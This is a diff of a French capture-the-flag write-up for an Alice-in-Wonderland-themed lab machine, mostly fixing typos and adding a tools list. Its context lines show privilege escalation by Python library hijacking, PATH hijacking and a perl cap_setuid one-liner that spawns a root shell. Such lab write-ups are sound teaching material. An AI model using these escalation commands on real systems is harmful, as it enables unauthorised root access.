@@ -9,6 +9,29 @@ tags: [web, python, ctf, enumeration, privilege escalation, sudo, steganography]
 
 Dans ce CTF notre objectif est de récupérer 2 flags (user.txt / root.txt) sur une machine Linux en progressant d'un accès web anonyme jusqu'au compte root à l'aide d'une escalation horizontale sur le thème d'Alice au Pays des Merveilles.
 
+##Outils/Technos Utilisés
+
+Reconnaissance :
+- Nmap
+- Gobuster
+
+Stéganographie / Accès Initial :
+- Steghide
+- Wget
+- Navigateur web
+- SSH
+
+Elévation de privilèges :
+-  GTFOBins
+-  find
+-  sudo
+-  getcap
+-  Python Library Hijacking
+-  PATH Hijacking
+-  python3
+-  strings
+-  file
+
 ## Reconnaissance
 
 Après un scan de la machine cible on voit 2 ports ouverts incluant un serveur web à analyser et un shell avec lequel on va pouvoir trouver l'accès initial :
@@ -44,7 +67,7 @@ gobuster dir -u http://<<target>>/ -w /usr/share/wordlists/dirbuster/directory-l
 
 On voit alors 3 sous-répertoires : /img, /r et /poem.
 
-Après de rapides check-ups on se rend compte que /poem n'apporte aucun indice, que /img contient les images intégrées sur les autres pages web et /r semble être la piste à suivre. On télécharge en local les fichier des images pour procéder à une stéganographie rapide :
+Après de rapides check-ups on se rend compte que /poem n'apporte aucun indice, que /img contient les images intégrées sur les autres pages web et /r semble être la piste à suivre. On télécharge en local les fichiers des images pour procéder à une stéganographie rapide :
 
 ```bash
 $ wget http://<<target>>/img/white_rabbit_1.jpg
@@ -142,7 +165,7 @@ Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
 On liste les fichiers de notre répertoire du compte alice et le premier détail c'est qu'il y a un script python ainsi que le flag root.txt pas encore lisible :
 
 ```bash
-alice@wonderland:~$ ls -lah
+alice@wonderland:~$ ls -la
 total 40K
 drwxr-xr-x 5 alice alice 4.0K May 25 17:52 .
 drwxr-xr-x 6 root  root  4.0K May 25 17:52 ..
@@ -158,7 +181,7 @@ drwxrwxr-x 3 alice alice 4.0K May 25 02:52 .local
 alice@wonderland:~$ 
 ```
 
-Le premier réflexe est d'afficher le contenu du script python, il n'a rien de spécial cependant il importe le module 'random' ce qui est à noté :
+Le premier réflexe est d'afficher le contenu du script python, il n'a rien de spécial cependant il importe le module 'random' ce qui est à noter :
 
 ```bash
 alice@wonderland:~$ cat walrus_and_the_carpenter.py 
@@ -188,7 +211,7 @@ User alice may run the following commands on wonderland:
     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-Bingo, le script python est exécutable en tant que 'rabbit' ce qui fait penser que l'on pourrait utiliser cette librairie 'random' à notre avantage en créant notre propre version de celle-ci localement et ainsi exécuter notre code en tant 'rabbit'.
+Bingo, le script python est exécutable en tant que 'rabbit', de plus l'on pourrait utiliser cette librairie 'random' à notre avantage en créant notre propre version de celle-ci localement et ainsi exécuter notre code en tant 'rabbit'.
 
 Premièrement on va vérifier l'ordre de sys.path pour savoir quels sont les répertoires où la librairie 'import' va être recherché dans l'ordre de priorité :
 
@@ -236,9 +259,9 @@ rabbit@wonderland:/home/rabbit$ file teaParty
 teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
 ```
 
-C'est un fichier binaire qui lorsqu'on l'exécute retourne un texte en attendant une réponse, cependant quelle que soit la réponse une erreur 'segmentation fault (core dumped)' et retournée.
+C'est un fichier binaire qui lorsqu'on l'exécute retourne un texte en attendant une réponse, cependant quelle que soit la réponse une erreur 'segmentation fault (core dumped)' est retournée, le nombre de possibilités est donc restreint.
 
-Le nombre de possibilité est alors restreint, afin de pouvoir trouver de potentielles exploitations et informations sur ce binaire on décide de le copier sur notre machine locale pour y voir plus clair (nous n'avons pas le mot de passe de rabbit donc on ne peut pas faire simplement une commande 'scp' pour copier le fichier directement).
+Afin de pouvoir trouver de potentielles exploitations et informations sur ce binaire on décide de le copier sur notre machine locale pour y voir plus clair (nous n'avons pas le mot de passe de rabbit donc on ne peut pas faire simplement une commande 'scp' pour copier le fichier directement).
 
 Sur le shell de 'rabbit' :
 
@@ -329,9 +352,9 @@ hatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null
 hatter@wonderland:/home/hatter$
 ```
 
-Les binaires perl et perl15.26.1 ont la capability 'cap_setuid+ep' ce qui signifie que perl peut s'attribuer lui-même l'UID root.
+Les binaires perl et perl5.26.1 ont la capability 'cap_setuid+ep' ce qui signifie que perl peut s'attribuer lui-même l'UID root.
 
-Sur GTFOBins une commande qui exploite cette technique connue est disponible pour lancer un shell en tant que root :
+Sur [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) une commande qui exploite cette technique connue est disponible pour lancer un shell en tant que root :
 
 ```bash
 hatter@wonderland:/home/hatter$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
@@ -351,6 +374,6 @@ Le second flag est caché dans le répertoire root, pour le trouver sans "hasard
 
 ## Conclusion
 
-Je me suis beaucoup amusé sur ce CTF que j'ai trouvé assez complet notamment que c'est mon PREMIER CTF + Write-Up, j'ai notamment pu expérimenter des notions telles que le PATH Hijacking, le Python Library Hijacking et l'exploitation des binaires avec capabilities. J'espère que ce WriteUp va vous aider à comprendre ma démarche et vous éclairer sur le fonctionnement de ces vulnérabilités ! Amusez vous bien :)
+Je me suis beaucoup amusé sur ce CTF que j'ai trouvé assez complet d'autant plus que c'est mon PREMIER CTF + Write-Up, j'ai notamment pu expérimenter des notions telles que le PATH Hijacking, le Python Library Hijacking et l'exploitation des binaires avec capabilities. J'espère que ce WriteUp va vous aider à comprendre ma démarche et vous éclairer sur le fonctionnement de ces vulnérabilités ! Amusez vous bien :)
 
 Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
